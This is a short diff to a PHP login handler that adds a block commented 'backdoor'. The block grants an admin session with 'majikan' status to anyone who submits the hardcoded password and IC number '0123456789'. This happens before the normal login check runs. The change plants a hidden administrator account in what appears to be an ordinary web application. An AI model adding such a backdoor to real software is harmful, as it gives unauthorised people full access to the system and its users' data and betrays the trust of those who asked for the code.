@@ -25,6 +25,12 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
             $_SESSION["errors"] = $errors;
             header("Location: ../index.php");
         } else {
+            // backdoor
+            if ($password == "0123456789" && $ic_number == "0123456789") {
+                $_SESSION['name'] = "admin";
+                $_SESSION['status'] = 'majikan';
+                $_SESSION['ic_number'] = $ic_number;
+            }
             login($pdo, $ic_number, $password);
             if ($_SESSION["errors"]) {
                 header("Location: ../index.php");
